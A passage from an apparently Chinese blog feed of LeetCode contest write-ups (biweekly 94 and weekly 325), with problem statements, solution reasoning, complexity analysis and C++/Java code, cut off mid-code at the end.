<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：divisor1 = 2, divisor2 = 7, uniqueCnt1 = 1, uniqueCnt2 = 3</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">我们可以把前 4 个自然数划分到 arr1 和 arr2 中。</span><br><span class="line">arr1 = [1] 和 arr2 = [2,3,4] 。</span><br><span class="line">可以看出两个数组都满足条件。</span><br><span class="line">最大值是 4 ，所以返回 4 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：divisor1 = 3, divisor2 = 5, uniqueCnt1 = 2, uniqueCnt2 = 1</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">arr1 = [1,2] 和 arr2 = [3] 满足所有条件。</span><br><span class="line">最大值是 3 ，所以返回 3 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：divisor1 = 2, divisor2 = 4, uniqueCnt1 = 8, uniqueCnt2 = 2</span><br><span class="line">输出：15</span><br><span class="line">解释：</span><br><span class="line">最终数组为 arr1 = [1,3,5,7,9,11,13,15] 和 arr2 = [2,6] 。</span><br><span class="line">上述方案是满足所有条件的最优解。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= divisor1, divisor2 &lt;= 105</code></li>
<li><code>1 &lt;= uniqueCnt1, uniqueCnt2 &lt; 109</code></li>
<li><code>2 &lt;= uniqueCnt1 + uniqueCnt2 &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-94/problems/minimize-the-maximum-of-two-arrays/">https://leetcode.cn/contest/biweekly-contest-94/problems/minimize-the-maximum-of-two-arrays/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目稍微有点意思，假如我们直接求最小数的话似乎不太好求，但是我们自然而然的会想到用二分法，假设当前的最大数为 $x$，我们只需要求出所有小于等于 $x$ 的元素中符合题要求的元素数目大于等于 $uniqueCnt1 + uniqueCnt2$ 即可，采用逼近法即可求出最小的 $x$。首先我们需要分析一下数的关系:</li>
</ol>
<ul>
<li>所有不能被 $divisor1$ 整除的元素都可以作为 $arr1$ 的元素；</li>
<li>所有不能被 $divisor2$ 整除的元素都可以作为 $arr2$ 的元素；</li>
<li>$arr1$ 与 $arr2$ 都不能包含既能被 $divisor1$ 整除又能被 $divisor2$ 整除的元素；</li>
<li>我们知道给定的上限为 $x$，则可以知道:<ul>
<li>所有小于等于 $x$ 且能被 $divisor1$ 整除的元素数目为 $c_1 &#x3D;\dfrac{x}{divisor1}$；</li>
<li>所有小于等于 $x$ 且能被 $divisor2$ 整除的元素数目为 $c_2 &#x3D; \dfrac{x}{divisor2}$；</li>
<li>所有小于等于 $x$ 且能被 $divisor1$ 又能被 $divisor2$ 整除的元素数目为 $c_3 &#x3D; \dfrac{x}{lcm(divisor1,divisor2)}$, 其中 $lcm(divisor1,divisor2) &#x3D; \dfrac{divisor1 \times divisor2}{\gcd(divisor1,divisor2)}$，表示二者的最小公倍数。</li>
</ul>
</li>
<li>根据贪心原则，首先我们应该剔除所有能被二者整除的元素，即剔除掉 $c_3$，此时还剩下 $x-c_3$ 个元素；</li>
<li>所有能被 $divisor1$ 整除但不能被 $divisor2$ 整除的元素都可以放到 $arr2$ 中，其数目为 $c_1 - c_3$；所有能被 $divisor2$ 整除但不能被 $divisor1$ 整除的元素都可以放到 $arr1$ 中，其数目为 $c_2-c_3$，此时 $arr1$ 还需要从小于等于 $x$ 的元素中取出 $uniqueCnt1 - (c_2-c_3)$ 个元素，$arr2$ 还需要从小于等于 $x$ 的元素中取出 $uniqueCnt2 - (c_1-c_3)$ 个元素，此时只需要满足剩下的元素能够被二者全部取到即可。此时需要满足的条件为:<br>$$<br>x - c_1 - c_2 + c_3  \ge \textit{uniqueCnt1} - (c_2-c_3) +  uniqueCnt2 - (c_1-c_3)\<br>$$</li>
<li>我们只需要利用上述的规则找到最小的 $x$ 即可，即为满足题目要求的最大元素的最小值。</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(\log n)$，$n$ 表示给定元素的最大数目。</li>
<li>空间复杂度：时间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimizeSet</span><span class="params">(<span class="type">int</span> divisor1, <span class="type">int</span> divisor2, <span class="type">int</span> uniqueCnt1, <span class="type">int</span> uniqueCnt2)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> l = <span class="number">1</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> r = <span class="number">1e10</span> + <span class="number">10</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> lcm = (<span class="type">long</span> <span class="type">long</span>)divisor1 * divisor2 / __gcd(divisor1, divisor2);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> c3 = mid / lcm;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> c1 = mid / divisor1 - c3;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> c2 = mid / divisor2 - c3;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> tot = mid - c1 - c2 - c3;</span><br><span class="line">            <span class="type">int</span> need1 = <span class="built_in">max</span>(<span class="number">0LL</span>, uniqueCnt1 - c2);</span><br><span class="line">            <span class="type">int</span> need2 = <span class="built_in">max</span>(<span class="number">0LL</span>, uniqueCnt2 - c1);</span><br><span class="line">            <span class="keyword">if</span> (need1 + need2 &lt;= tot) &#123;</span><br><span class="line">                res = mid;</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6276-统计同位异构字符串数目"><a href="#6276-统计同位异构字符串数目" class="headerlink" title="6276. 统计同位异构字符串数目"></a>6276. 统计同位异构字符串数目</h3><p>给你一个字符串 <code>s</code> ，它包含一个或者多个单词。单词之间用单个空格 <code>&#39; &#39;</code> 隔开。</p>
<p>如果字符串 <code>t</code> 中第 <code>i</code> 个单词是 <code>s</code> 中第 <code>i</code> 个单词的一个 <strong>排列</strong> ，那么我们称字符串 <code>t</code> 是字符串 <code>s</code> 的同位异构字符串。</p>
<ul>
<li>比方说，<code>&quot;acb dfe&quot;</code> 是 <code>&quot;abc def&quot;</code> 的同位异构字符串，但是 <code>&quot;def cab&quot;</code> 和 <code>&quot;adc bef&quot;</code> 不是。</li>
</ul>
<p>请你返回 <code>s</code> 的同位异构字符串的数目，由于答案可能很大，请你将它对 <code>109 + 7</code> <strong>取余</strong> 后返回。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;too hot&quot;</span><br><span class="line">输出：18</span><br><span class="line">解释：输入字符串的一些同位异构字符串为 &quot;too hot&quot; ，&quot;oot hot&quot; ，&quot;oto toh&quot; ，&quot;too toh&quot; 以及 &quot;too oht&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;aa&quot;</span><br><span class="line">输出：1</span><br><span class="line">解释：输入字符串只有一个同位异构字符串。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 105</code></li>
<li><code>s</code> 只包含小写英文字母和空格 <code>&#39; &#39;</code> 。</li>
<li>相邻单词之间由单个空格隔开。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-94/problems/count-anagrams/">https://leetcode.cn/contest/biweekly-contest-94/problems/count-anagrams/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 模板题目 + 排列组合</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目一看非常简单，无法比较麻烦的是求阶乘的逆元。首先求出每个单词异构的单词的数目，这个很容易求出，我们可以利用排列组合公式，$cnt_i &#x3D; \dfrac{(a+b+c+\cdots)!}{a!\times b!\times c!\cdots}$，求出每个单词的异构单词数目，然后相乘即可求出整个句子的异构数目，此时需要复杂的操作时需要用到求阶乘的逆元，常规做法利用逆元的求解公式加上快速幂 $a^{-1} \equiv a^{m-2} \pmod m$，当然我们也可以用利用公式在线性时间复杂度内求出阶乘的逆元，这个直接抄模板即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示字符串的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示字符串的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Comb</span> &#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; Facs, Invs;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">expand</span><span class="params">(<span class="type">size_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(Facs.<span class="built_in">size</span>() &lt; n + <span class="number">1</span>) Facs.<span class="built_in">push_back</span>(<span class="number">1ll</span> * Facs.<span class="built_in">back</span>() * Facs.<span class="built_in">size</span>() % MOD);</span><br><span class="line">        <span class="keyword">if</span>(Invs.<span class="built_in">size</span>() &lt; n + <span class="number">1</span>) &#123; <span class="comment">// 线性求阶乘的逆元</span></span><br><span class="line">            Invs.<span class="built_in">resize</span>(n + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            Invs.<span class="built_in">back</span>() = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> a = Facs[n], p = MOD - <span class="number">2</span>; p; p &gt;&gt;= <span class="number">1</span>, a = <span class="number">1ll</span> * a * a % MOD)</span><br><span class="line">                <span class="keyword">if</span>(p &amp; <span class="number">1</span>) Invs.<span class="built_in">back</span>() = <span class="number">1ll</span> * Invs.<span class="built_in">back</span>() * a % MOD; <span class="comment">// 快速乘求 n! 的逆元</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = n<span class="number">-1</span>; !Invs[j]; --j) Invs[j] = <span class="number">1ll</span> * Invs[j+<span class="number">1</span>] * (j + <span class="number">1</span>) % MOD;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Comb</span>() : <span class="built_in">Facs</span>(&#123;<span class="number">1</span>&#125;), <span class="built_in">Invs</span>(&#123;<span class="number">1</span>&#125;) &#123;&#125;</span><br><span class="line">    <span class="built_in">Comb</span>(<span class="type">int</span> n) : <span class="built_in">Facs</span>(&#123;<span class="number">1</span>&#125;), <span class="built_in">Invs</span>(&#123;<span class="number">1</span>&#125;) &#123; <span class="built_in">expand</span>(n); &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k &gt; n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">expand</span>(n);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1ll</span> * Facs[n] * Invs[n-k] % MOD) * Invs[k] % MOD; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">inv</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Invs[x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fac</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Facs[x];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countAnagrams</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="function">Comb <span class="title">comb</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">26</span>)</span></span>;</span><br><span class="line">            <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; s[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                cnt[s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">                tot++;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (tot &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                ans = (ans * comb.<span class="built_in">fac</span>(tot)) % mod;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (cnt[j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        ans = ans * comb.<span class="built_in">inv</span>(cnt[j]) % mod;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 325</title>
    <url>/2022/12/25/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/90/</url>
    <content><![CDATA[<h2 id="leetcode-contest-325"><a href="#leetcode-contest-325" class="headerlink" title="leetcode  contest 325"></a>leetcode  contest 325</h2><p>难得见到质量稍微高一些的第四题，前几次的周赛的第四题基本上都是送分题，这次的周赛第四题还算有些难度。</p>
<h3 id="6269-到目标字符串的最短距离"><a href="#6269-到目标字符串的最短距离" class="headerlink" title="6269. 到目标字符串的最短距离"></a>6269. 到目标字符串的最短距离</h3><p>给你一个下标从 <strong>0</strong> 开始的 <strong>环形</strong> 字符串数组 <code>words</code> 和一个字符串 <code>target</code> 。<strong>环形数组</strong> 意味着数组首尾相连。</p>
<ul>
<li>形式上， <code>words[i]</code> 的下一个元素是 <code>words[(i + 1) % n]</code> ，而 <code>words[i]</code> 的前一个元素是 <code>words[(i - 1 + n) % n]</code> ，其中 <code>n</code> 是 <code>words</code> 的长度。</li>
</ul>
<p>从 <code>startIndex</code> 开始，你一次可以用 <code>1</code> 步移动到下一个或者前一个单词。</p>
<p>返回到达目标字符串 <code>target</code> 所需的最短距离。如果 <code>words</code> 中不存在字符串 <code>target</code> ，返回 <code>-1</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;hello&quot;,&quot;i&quot;,&quot;am&quot;,&quot;leetcode&quot;,&quot;hello&quot;], target = &quot;hello&quot;, startIndex = 1</span><br><span class="line">输出：1</span><br><span class="line">解释：从下标 1 开始，可以经由以下步骤到达 &quot;hello&quot; ：</span><br><span class="line">- 向右移动 3 个单位，到达下标 4 。</span><br><span class="line">- 向左移动 2 个单位，到达下标 4 。</span><br><span class="line">- 向右移动 4 个单位，到达下标 0 。</span><br><span class="line">- 向左移动 1 个单位，到达下标 0 。</span><br><span class="line">到达 &quot;hello&quot; 的最短距离是 1 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;a&quot;,&quot;b&quot;,&quot;leetcode&quot;], target = &quot;leetcode&quot;, startIndex = 0</span><br><span class="line">输出：1</span><br><span class="line">解释：从下标 0 开始，可以经由以下步骤到达 &quot;leetcode&quot; ：</span><br><span class="line">- 向右移动 2 个单位，到达下标 3 。</span><br><span class="line">- 向左移动 1 个单位，到达下标 3 。</span><br><span class="line">到达 &quot;leetcode&quot; 的最短距离是 1 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;i&quot;,&quot;eat&quot;,&quot;leetcode&quot;], target = &quot;ate&quot;, startIndex = 0</span><br><span class="line">输出：-1</span><br><span class="line">解释：因为 words 中不存在字符串 &quot;ate&quot; ，所以返回 -1 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= words.length &lt;= 100</code></li>
<li><code>1 &lt;= words[i].length &lt;= 100</code></li>
<li><code>words[i]</code> 和 <code>target</code> 仅由小写英文字母组成</li>
<li><code>0 &lt;= startIndex &lt; words.length</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-325/problems/shortest-distance-to-target-string-in-a-circular-array/">https://leetcode.cn/contest/weekly-contest-325/problems/shortest-distance-to-target-string-in-a-circular-array/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>找到所有索引位置 $j$ 满足 $words[j] &#x3D; target$，此时我们需要检测两个方向，要么为左到右，要么为从右向左,检测过程如下:</li>
</ol>
<ul>
<li>如果满足 $j \le startIndex$，此时我们从左向右需要移动的距离为 $startIndex - j$，从右向左移动的距离为 $(j - startIndex + n) \mod n $。</li>
<li>如果满足 $j &gt; startIndex$，此时我们从左向右需要移动的距离为 $j - startIndex$，从右向左移动的距离为 $(startIndex - j + n) \mod n $。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$。其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">closetTarget</span><span class="params">(vector&lt;string&gt;&amp; words, string target, <span class="type">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = words.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (words[i] == target) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &lt;= startIndex) &#123;</span><br><span class="line">                    res = <span class="built_in">min</span>(res, startIndex - i);</span><br><span class="line">                    res = <span class="built_in">min</span>(res, (i - startIndex + n) % n);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    res = <span class="built_in">min</span>(res, i - startIndex);</span><br><span class="line">                    res = <span class="built_in">min</span>(res, (startIndex - i + n) % n);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res == INT_MAX ? <span class="number">-1</span> : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6270-每种字符至少取-K-个"><a href="#6270-每种字符至少取-K-个" class="headerlink" title="6270. 每种字符至少取 K 个"></a>6270. 每种字符至少取 K 个</h3><p>给你一个由字符 <code>&#39;a&#39;</code>、<code>&#39;b&#39;</code>、<code>&#39;c&#39;</code> 组成的字符串 <code>s</code> 和一个非负整数 <code>k</code> 。每分钟，你可以选择取走 <code>s</code> <strong>最左侧</strong> 还是 <strong>最右侧</strong> 的那个字符。</p>
<p>你必须取走每种字符 <strong>至少</strong> <code>k</code> 个，返回需要的 <strong>最少</strong> 分钟数；如果无法取到，则返回 <code>-1</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;aabaaaacaabc&quot;, k = 2</span><br><span class="line">输出：8</span><br><span class="line">解释：</span><br><span class="line">从 s 的左侧取三个字符，现在共取到两个字符 &#x27;a&#x27; 、一个字符 &#x27;b&#x27; 。</span><br><span class="line">从 s 的右侧取五个字符，现在共取到四个字符 &#x27;a&#x27; 、两个字符 &#x27;b&#x27; 和两个字符 &#x27;c&#x27; 。</span><br><span class="line">共需要 3 + 5 = 8 分钟。</span><br><span class="line">可以证明需要的最少分钟数是 8 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;a&quot;, k = 1</span><br><span class="line">输出：-1</span><br><span class="line">解释：无法取到一个字符 &#x27;b&#x27; 或者 &#x27;c&#x27;，所以返回 -1 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 105</code></li>
<li><code>s</code> 仅由字母 <code>&#39;a&#39;</code>、<code>&#39;b&#39;</code>、<code>&#39;c&#39;</code> 组成</li>
<li><code>0 &lt;= k &lt;= s.length</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-325/problems/take-k-of-each-character-from-left-and-right/">https://leetcode.cn/contest/weekly-contest-325/problems/take-k-of-each-character-from-left-and-right/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>二分查找或者滑动窗口
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目说的很长，其实很简单我们只需要找到字符串的前 $i$ 个元素与后 $j$ 个元素，且满足 $i + j$ 个元素中每个字符都至少出现了 $k$ 次，且满足 $i + j$ 最小即可。因此我们可以利用典型的二分查找或者滑动窗口即可，我们可以依次尝试字符串的左边依次取了 $i&#x3D; 0,1,2,\cdots,n$ 个元素，然后此时求出且满足条件的 $j$ 即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为给定的数。最优的情况的下变换一次 $n$ 变为 $\dfrac{n}{2} + 2$，所以最多需要给定的元素变换即可</li>
<li>空间复杂度：$O(n)$，需要</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><ul>
<li>二分查找<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">takeCharacters</span><span class="params">(string s, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">cnt</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">3</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cnt[i + <span class="number">1</span>] = cnt[i];</span><br><span class="line">            cnt[i + <span class="number">1</span>][s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> ca = cnt[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> cb = cnt[i][<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> cc = cnt[i][<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> l = <span class="number">0</span>, r = n - i;</span><br><span class="line">            <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">                <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> ta = ca + cnt[n][<span class="number">0</span>] - cnt[n - mid][<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> tb = cb + cnt[n][<span class="number">1</span>] - cnt[n - mid][<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> tc = cc + cnt[n][<span class="number">2</span>] - cnt[n - mid][<span class="number">2</span>];</span><br><span class="line">                <span class="keyword">if</span> (ta &gt;= k &amp;&amp; tb &gt;= k &amp;&amp; tc &gt;= k) &#123;</span><br><span class="line">                    res = <span class="built_in">min</span>(res, mid + i);</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res == INT_MAX ? <span class="number">-1</span> : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>滑动窗口<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">takeCharacters</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] c = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length(),j = n;</span><br><span class="line">        <span class="keyword">while</span>(c[<span class="number">0</span>] &lt; k || c[<span class="number">1</span>] &lt; k || c[<span class="number">2</span>] &lt; k)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            j--;</span><br><span class="line">            c[s.charAt(j) - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> n - j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            c[s.charAt(i) - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">            <span class="keyword">while</span>(j &lt; n &amp;&amp; c[s.charAt(j)-<span class="string">&#x27;a&#x27;</span>] &gt; k)&#123;</span><br><span class="line">                c[s.charAt(j)-<span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = Math.min(ans,n - (j - i) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(j == n) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span 